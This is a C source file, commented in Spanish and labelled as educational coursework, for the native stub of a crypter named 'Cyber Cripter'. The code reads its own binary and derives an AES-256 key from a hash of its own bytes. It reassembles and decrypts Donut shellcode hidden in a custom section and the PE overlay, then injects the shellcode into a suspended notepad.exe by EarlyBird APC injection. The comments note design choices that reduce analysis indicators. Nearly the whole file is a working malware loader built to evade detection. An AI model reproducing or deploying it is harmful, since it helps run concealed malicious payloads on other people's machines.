/*
 * Cyber Cripter — native stub (educational coursework).
 *
 * Este binario es la plantilla pre-compilada del loader que el builder C# parchea.
 * El layout en disco, tras el parcheo, es:
 *
 *   Sección .cdata (datos const inicializados, mapeados solo-lectura en runtime):
 *     g_meta        — StubMetadata (heap_marker, timestamp, IV, tamaños,
 *                      hash_region_size). Localizado via METADATA_MAGIC.
 *     g_half1_buf   — buffer prefijado con magic que contiene la primera mitad
 *                      del ciphertext. Localizado via HALF1_MAGIC. Capacidad HALF1_MAX bytes.
 *
 *   PE overlay (bytes en bruto tras la última sección del PE):
 *     segunda mitad del ciphertext — half2 (tamaño en g_meta.half2_size).
 *
 * Flujo en runtime:
 *   1. Leer el propio fichero desde disco.
 *   2. Re-derivar la clave AES-256:
 *         clave = SHA256( heap_marker || self_bytes[0..hash_region] || timestamp )
 *      Los bytes del stub en el hash actúan como anti-tamper: cualquier modificación
 *      del prefijo hasheado invalida la clave y el descifrado falla.
 *   3. Remontar el ciphertext completo = half1 || half2.
 *   4. Descifrar con AES-256-CBC con padding PKCS#7 -> shellcode (salida de Donut).
 *   5. Inyectar el shellcode mediante EarlyBird APC en un proceso notepad.exe suspendido.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>

#include <stdio.h>

#pragma comment(lib, "bcrypt.lib")

/* Capacidad máxima del buffer embebido en .cdata para la primera mitad del ciphertext (500 KiB).
   Debe coincidir con HALF1_MAX en StubBuilder.cs del builder C#. */
#define HALF1_MAX 0x7D000

/* Layout de los metadatos que el builder escribe en .cdata.
   #pragma pack(1) garantiza que no hay padding entre campos, lo cual es imprescindible
   porque el builder calcula los offsets de cada campo a mano (OFF_* en StubBuilder.cs). */
#pragma pack(push, 1)
typedef struct {
    unsigned char      magic[16];        /* marcador de 16 bytes para localizar la estructura */
    unsigned char      heap_marker[8];   /* 8 bytes aleatorios por build; entran en el hash de la clave */
    unsigned long long timestamp;        /* Unix timestamp del build en little-endian (u64) */
    unsigned char      iv[16];           /* IV de AES-256-CBC, 16 bytes aleatorios por build */
    unsigned int       half1_size;       /* tamaño en bytes de la primera mitad del ciphertext */
    unsigned int       half2_size;       /* tamaño en bytes de la segunda mitad (overlay PE) */
    unsigned int       hash_region_size; /* cuántos bytes del inicio del fichero entran en el hash */
} StubMetadata;
#pragma pack(pop)

// Se fuerza una sección propia (.cdata) para que el builder pueda localizar los datos
// mediante los magic markers sin necesidad de parsear cabeceras PE. 
   // Se puede considerar establecer Read & Write en un futuro, en caso que se desee actualizar el stub para que modifique el contenido de half1 durante la ejecución.
#pragma section(".cdata", read)

// Se crea StubMetadata dentro de .cdata
__declspec(allocate(".cdata"))
volatile const StubMetadata g_meta = {
    /* magic            */ { 'M','E','T','A','!','C','R','Y','p','T','e','R','!',
                              0xAA, 0xBB, 0xCC },
    /* heap_marker      */ { 0, 0, 0, 0, 0, 0, 0, 0 },
    /* timestamp        */ 0,
    /* iv               */ { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 },
    /* half1_size       */ 0,
    /* half2_size       */ 0,
    /* hash_region_size */ 0
};

// Se crea buffer de datos dentro de .cdata de (16 + HALF1_MAX) Bytes
__declspec(allocate(".cdata"))
volatile const unsigned char g_half1_buf[16 + HALF1_MAX] = {
    'H','A','L','F','!','O','N','E','!','D','A','T','A', 0xDD, 0xEE, 0xFF
    /* los HALF1_MAX bytes restantes se inicializan a cero pero se mantienen en disco
       porque el array en su conjunto está inicializado */
};

/* ---------- helpers mínimos (sin dependencia del CRT) ---------- */

/* El stub se compila sin CRT (C Runtime Library) para minimizar dependencias e indicadores de análisis.
   Estas funciones sustituyen a malloc/free/memcpy/memset usando la API de Win32. */

/**
 * @brief  Reserva n bytes en el heap del proceso. Sustituto de malloc sin CRT.
 * @param[in]  n  Número de bytes a reservar.
 * @return Puntero al bloque reservado, o NULL si falla la asignación.
 */
static void *xalloc(SIZE_T n) { return HeapAlloc(GetProcessHeap(), 0, n); }

/**
 * @brief  Libera un bloque previamente reservado con xalloc. No hace nada si p es NULL.
 * @param[in]  p  Puntero al bloque a liberar (puede ser NULL).
 */
static void  xfree(void *p)   { if (p) HeapFree(GetProcessHeap(), 0, p); }

/**
 * @brief  Copia n bytes de src a dst. Sustituto de memcpy sin CRT.
 * @param[out] dst  Buffer de destino; debe tener al menos n bytes disponibles.
 * @param[in]  src  Buffer de origen.
 * @param[in]  n    Número de bytes a copiar.
 */
static void xcopy(void *dst, const volatile void *src, SIZE_T n)
{
    unsigned char *d = (unsigned char *)dst;
    const volatile unsigned char *s = (const volatile unsigned char *)src;
    while (n--) *d++ = *s++;
}

/**
 * @brief  Sobreescribe n bytes de p con ceros. Sustituto de memset seguro sin CRT.
 *         volatile impide al compilador eliminar el bucle como "código muerto".
 * @param[in,out] p  Buffer a borrar.
 * @param[in]     n  Número de bytes a poner a cero.
 */
static void xzero(void *p, SIZE_T n)
{
    volatile unsigned char *d = (volatile unsigned char *)p;
    while (n--) *d++ = 0;
}

/* ---------- lectura del propio fichero desde disco ---------- */

/**
 * @brief  Lee el binario del stub completo desde disco usando GetModuleFileNameA.
 *         Necesario para hashear el prefijo en la derivación de clave y para acceder al overlay (half2).
 * @param[out] out_size  Tamaño del fichero leído en bytes.
 * @return 1 si la lectura fue correcta, 0 en caso de cualquier error de Win32.
 */
static int read_self(unsigned char **out, DWORD *out_size)
{
    char path[MAX_PATH];
    DWORD pl = GetModuleFileNameA(NULL, path, MAX_PATH);
    if (pl == 0 || pl >= MAX_PATH) return 0;

    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;

    LARGE_INTEGER fs;
    if (!GetFileSizeEx(h, &fs) || fs.QuadPart > 0x10000000) { /* límite de 256 MB */
        CloseHandle(h); return 0;
    }
    DWORD size = (DWORD)fs.QuadPart;
    unsigned char *buf = (unsigned char *)xalloc(size);
    if (!buf) { CloseHandle(h); return 0; }

    DWORD got = 0;
    if (!ReadFile(h, buf, size, &got, NULL) || got != size) {
        xfree(buf); CloseHandle(h); return 0;
    }
    CloseHandle(h);
    *out = buf; *out_size = size;
    return 1;
}

/* ---------- SHA-256 via CNG ---------- */

/**
 * @brief  Calcula el digest SHA-256 de un buffer usando la API CNG (BCrypt) del sistema.
 *         Se usa para derivar la clave AES-256: SHA256(heap_marker || self[0..hr] || timestamp).
 * @param[in]  in      Buffer de entrada a hashear.
 * @param[in]  in_len  Longitud del buffer de entrada en bytes.
 * @param[out] out     Array de 32 bytes donde se escribe el digest SHA-256 resultante.
 * @return 1 si el hash se calculó correctamente, 0 si CNG devolvió error.
 */
static int cng_sha256(const unsigned char *in, DWORD in_len, unsigned char out[32])
{
    BCRYPT_ALG_HANDLE  hAlg  = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    int ok = 0;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) return 0;
    if (BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) != 0) goto end;
    if (BCryptHashData(hHash, (PUCHAR)in, in_len, 0) != 0)        goto end;
    if (BCryptFinishHash(hHash, out, 32, 0) != 0)                 goto end;
    ok = 1;
end:
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg)  BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

/* ---------- descifrado AES-256-CBC con padding PKCS#7 via CNG ---------- */

/**
 * @brief  Descifra un buffer con AES-256-CBC (padding PKCS#7) usando la API BCrypt.
 *         Realiza dos llamadas a BCryptDecrypt: la primera con buffer NULL para obtener
 *         el tamaño exacto del plaintext; la segunda para el descifrado real.
 *         El IV se restaura entre ambas llamadas porque BCryptDecrypt lo muta al avanzar el estado CBC.
 * @param[in]  key     Clave AES de 32 bytes derivada por SHA-256.
 * @param[in]  iv_in   Vector de inicialización de 16 bytes; se copia internamente, no se modifica.
 * @param[in]  ct      Buffer con el ciphertext a descifrar.
 * @param[in]  ct_len  Longitud del ciphertext en bytes (debe ser múltiplo de 16).
 * @param[out] out     Dirección donde se escribe el puntero al plaintext descifrado.
 *                     El llamador debe liberarlo con xfree() cuando ya no lo necesite.
 * @param[out] out_len Longitud del plaintext en bytes tras eliminar el padding PKCS#7.
 * @return 1 si el descifrado fue correcto, 0 en caso de error de BCrypt o de memoria.
 */
static int cng_aes256cbc_decrypt(const unsigned char key[32],
                                 const unsigned char iv_in[16],
                                 const unsigned char *ct, DWORD ct_len,
                                 unsigned char **out, DWORD *out_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    unsigned char iv[16];
    unsigned char *pt = NULL;
    DWORD plen = 0;
    int ok = 0;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return 0;

    /* Configurar modo CBC antes de importar la clave */
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                          sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto end;
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                   (PUCHAR)key, 32, 0) != 0) goto end;

    /* Primera llamada: consultar tamaño de salida (PKCS#7 puede reducir el plaintext) */
    xcopy(iv, iv_in, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL, iv, 16,
                      NULL, 0, &plen, BCRYPT_BLOCK_PADDING) != 0) goto end;
    pt = (unsigned char *)xalloc(plen);
    if (!pt) goto end;

    /* Segunda llamada: descifrado real con el buffer reservado.
       También se restaura el IV porque BCryptDecrypt lo modificó en la llamada anterior. */
    xcopy(iv, iv_in, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL, iv, 16,
                      pt, plen, &plen, BCRYPT_BLOCK_PADDING) != 0) {
        xfree(pt); pt = NULL; goto end;
    }
    *out = pt; *out_len = plen;
    ok = 1;
end:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

/* ---------- inyección EarlyBird APC en notepad.exe ---------- */

/**
 * @brief  Inyecta shellcode PIC en notepad.exe mediante la técnica EarlyBird APC.
 *         Crea el proceso suspendido, escribe el shellcode en su espacio de memoria,
 *         encola una APC apuntando al shellcode y reanuda el hilo. La APC se dispara
 *         durante la espera alertable de NtTestAlert en la inicialización de ntdll,
 *         antes de que notepad.exe ejecute ningún código propio.
 *         La APC debe encolarse ANTES de ResumeThread; el shellcode debe ser PIC
 *         (position-independent code), como el que genera Donut con -f 1.
 * @param[in] sc      Buffer con el shellcode PIC a ejecutar en el proceso remoto.
 * @param[in] sc_len  Tamaño del shellcode en bytes.
 * @return 1 si la inyección se encoló correctamente, 0 si algún paso de Win32 falló.
 */
static int eb_apc_inject(const unsigned char *sc, SIZE_T sc_len)
{
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    char target[] = "C:\\Windows\\System32\\notepad.exe";
    SIZE_T written = 0;
    LPVOID rmem = NULL;

    xzero(&si, sizeof(si));
    xzero(&pi, sizeof(pi));
    si.cb = sizeof(si);

    /* Crear el proceso suspendido: el hilo primario queda bloqueado hasta ResumeThread */
    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] Error: No se pudo crear el proceso suspendido (CreateProcessA). GetLastError=%lu\n", GetLastError());                    
        return 0;
    }
    printf("[+] Proceso suspendido creado correctamente. PID=%lu, TID=%lu\n", pi.dwProcessId, pi.dwThreadId);

    /* Reservar memoria ejecutable en el espacio de direcciones del proceso remoto */
    rmem = VirtualAllocEx(pi.hProcess, NULL, sc_len,
                          MEM_COMMIT | MEM_RESERVE,
                          PAGE_READWRITE);
    if (!rmem) {
        printf("[-] Error: No se pudo reservar memoria en el proceso remoto (VirtualAllocEx). GetLastError=%lu\n", GetLastError());
        goto fail;
    }
    printf("[+] Memoria reservada correctamente en rmem=%p\n", rmem);

    /* Copiar el shellcode al proceso remoto */
    if (!WriteProcessMemory(pi.hProcess, rmem, sc, sc_len, &written) || written != sc_len) {
        printf("[-] Error: No se pudo escribir el shellcode en el proceso remoto (WriteProcessMemory). GetLastError=%lu\n", GetLastError());
        goto fail;
    }
    printf("[+] Shellcode copiado correctamente.\n");

    DWORD oldProtect = 0;
    /* Cambiar permisos a ejecutable después de escribir el shellcode */
    if (!VirtualProtectEx(pi.hProcess, rmem, sc_len, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] Error: No se pudo cambiar los permisos de memoria (VirtualProtectEx). GetLastError=%lu\n", GetLastError());
        goto fail;
    }
    printf("[+] Permisos de memoria cambiados correctamente a PAGE_EXECUTE_READ\n");

    /* Encolar la APC en el hilo primario antes de reanudarlo.
       El APC dispara cuando el hilo entre en una espera alertable (NtTestAlert loop),
       lo que ocurre muy al inicio de la carga de notepad.exe, de ahí el nombre EarlyBird. */
    if (!QueueUserAPC((PAPCFUNC)rmem, pi.hThread, 0)) {
        printf("[-] Error: No se pudo encolar la APC (QueueUserAPC). GetLastError=%lu\n", GetLastError());
        goto fail;
    }
    printf("[+] APC encolada correctamente\n");

    /* Reanudar el hilo: a partir de aquí el hilo ejecutará la APC (shellcode) en lugar
       de seguir con la inicialización normal del proceso. */
    ResumeThread(pi.hThread);
    printf("[+] Hilo reanudado correctamente\n");
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;

fail:
    /* Si algo falla antes de reanudar, terminar el proceso suspendido para no dejarlo huérfano */
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}

// static int eb_apc_inject(const unsigned char *sc, SIZE_T sc_len)
// {
//     STARTUPINFOA        si;
//     PROCESS_INFORMATION pi;
//     char target[] = "C:\\Windows\\System32\\notepad.exe";
//     SIZE_T written = 0;
//     LPVOID rmem = NULL;

//     xzero(&si, sizeof(si));
//     xzero(&pi, sizeof(pi));
//     si.cb = sizeof(si);

//     /* Crear el proceso suspendido */
//     if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
//                         CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return 0;

//     /* Reservar memoria con permisos de solo lectura/escritura */
//     rmem = VirtualAllocEx(pi.hProcess, NULL, sc_len,
//                           MEM_COMMIT | MEM_RESERVE,
//                           PAGE_READWRITE);
//     if (!rmem) goto fail;

//     /* Copiar el shellcode al proceso remoto */
//     if (!WriteProcessMemory(pi.hProcess, rmem, sc, sc_len, &written)
//         || written != sc_len) goto fail;

//     /* Cambiar permisos a ejecutable después de escribir el shellcode */
//     if (!VirtualProtectEx(pi.hProcess, rmem, sc_len,
//                           PAGE_EXECUTE_READWRITE, NULL)) goto fail;

//     /* Encolar la APC */
//     if (!QueueUserAPC((PAPCFUNC)rmem, pi.hThread, 0)) goto fail;

//     /* Reanudar el hilo */
//     ResumeThread(pi.hThread);
//     CloseHandle(pi.hThread);
//     CloseHandle(pi.hProcess);
//     return 1;

// fail:
//     /* Limpiar recursos */
//     if (pi.hProcess) TerminateProcess(pi.hProcess, 1);
//     if (pi.hThread) CloseHandle(pi.hThread);
//     if (pi.hProcess) CloseHandle(pi.hProcess);
//     return 0;
// }

/* ----------DEBUG---------*/
static void init_console(void)
{
    if (!AttachConsole(ATTACH_PARENT_PROCESS))
        AllocConsole();

    FILE *fp;

    freopen_s(&fp, "CONOUT$", "w", stdout);
    freopen_s(&fp, "CONOUT$", "w", stderr);
    freopen_s(&fp, "CONIN$",  "r", stdin);

    SetConsoleOutputCP(CP_UTF8);
}

/* --------MAIN-------- */
/**
 * @brief  Punto de entrada del stub. Orquesta los cinco pasos del flujo completo:
 *         lectura propia → derivación de clave AES → remontar ciphertext →
 *         descifrar AES-256-CBC → inyección EarlyBird APC en notepad.exe.
 * @param hInst  Handle de instancia del módulo (no usado).
 * @param hPrev  Handle de instancia previa, siempre NULL en Win32 moderno (no usado).
 * @param lpCmd  Línea de comandos en texto (no usada).
 * @param nShow  Modo de ventana inicial (no usado; el stub no tiene UI).
 * @return 0 si el shellcode se inyectó correctamente; 1–6 indican el paso que falló.
 */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    // UNCOMMENT THIS LINE FOR DEBUGGING
    init_console();

    /* Paso 1: leer el propio binario desde disco */
    unsigned char *self = NULL;
    DWORD self_size = 0;
    if (!read_self(&self, &self_size)) {
        printf("[-] Error: No se pudo leer el binario desde disco.\n");
        return 1;
    }

    DWORD hr = g_meta.hash_region_size;
    DWORD h1 = g_meta.half1_size;
    DWORD h2 = g_meta.half2_size;

    /* Validar que los metadatos tienen sentido antes de usarlos como índices de memoria */
    if (hr == 0 || hr > self_size || h1 > HALF1_MAX || h2 > self_size || (h1 + h2) < h1) {
        printf("[-] Error: Datos de metadatos inválidos (hash_region_size=%u, half1_size=%u, half2_size=%u, self_size=%u)\n",
               hr, h1, h2, self_size);
        xfree(self); 
        return 2;
    }
    printf("[+] 1. Binario leido desde el disco.\n");


    /* Paso 2: derivar la clave AES = SHA256(heap_marker || self[0..hr] || timestamp) */
    DWORD hin_len = 8 + hr + 8;
    unsigned char *hin = (unsigned char *)xalloc(hin_len);
    if (!hin) { 
        printf("[-] Error: No se pudo asignar memoria para hin.\n");
        xfree(self); 
        return 3; 
    }

    xcopy(hin,            g_meta.heap_marker, 8);
    xcopy(hin + 8,        self, hr);
    xcopy(hin + 8 + hr,   (const volatile unsigned char *)&g_meta.timestamp, 8);

    unsigned char key[32];
    int ok = cng_sha256(hin, hin_len, key);
    xzero(hin, hin_len); xfree(hin); /* borrar el buffer intermedio del heap */
    if (!ok) { 
        printf("[-] Error: Falló el cálculo de SHA256 para la clave.\n");
        xfree(self); 
        return 4; 
    }

    printf("[+] 2. Clave leida desde el disco: \n");
    for (int i = 0; i < 32; i++) printf("%02X", key[i]);
    printf("\n");


    /* Paso 3: remontar el ciphertext completo = half1 (embebido en .cdata) || half2 (overlay PE).*/
    DWORD ct_len = h1 + h2;
    unsigned char *ct = (unsigned char *)xalloc(ct_len);
    if (!ct) { 
        printf("[-] Error: No se pudo asignar memoria para el ciphertext.\n");
        xzero(key, 32); 
        xfree(self); 
        return 5; 
    }
    xcopy(ct,        (g_half1_buf + 16), h1);
    xcopy(ct + h1,   self + (self_size - h2), h2);
    xfree(self); /* ya no necesitamos el fichero en memoria */
    printf("[+] 3. Ciphertext reconstruido.\n");

    
    /* Paso 4: descifrar el ciphertext con AES-256-CBC -> shellcode Donut */

    // Extraer el IV de los metadatos
    unsigned char iv[16];
    xcopy(iv, g_meta.iv, 16);

    unsigned char *sc = NULL;
    DWORD sc_len = 0;
    ok = cng_aes256cbc_decrypt(key, iv, ct, ct_len, &sc, &sc_len);

    /* Limpiar material criptográfico del heap inmediatamente tras el descifrado */
    xzero(key, 32); xzero(iv, 16); xzero(ct, ct_len); xfree(ct);
    if (!ok) {
        printf("[-] Error: Falló el descifrado AES-256-CBC.\n");
        return 6;
    }

    printf("[+] 4. Descifrado del código completado.\n");

    /* Paso 5: inyectar el shellcode en notepad.exe mediante EarlyBird APC */
    eb_apc_inject(sc, sc_len);

    /* Borrar el shellcode del heap antes de salir */
    xzero(sc, sc_len); xfree(sc);

    /* Esperar brevemente para que la APC tenga tiempo de ejecutarse antes de que
       este proceso termine (si termina primero el proceso que inyectó también puede
       limpiar handles, pero la APC ya está encolada en el proceso remoto). */
    Sleep(2000);

    printf("[+] 5. EarlyBird APC completada.\n");
    return 0;
}
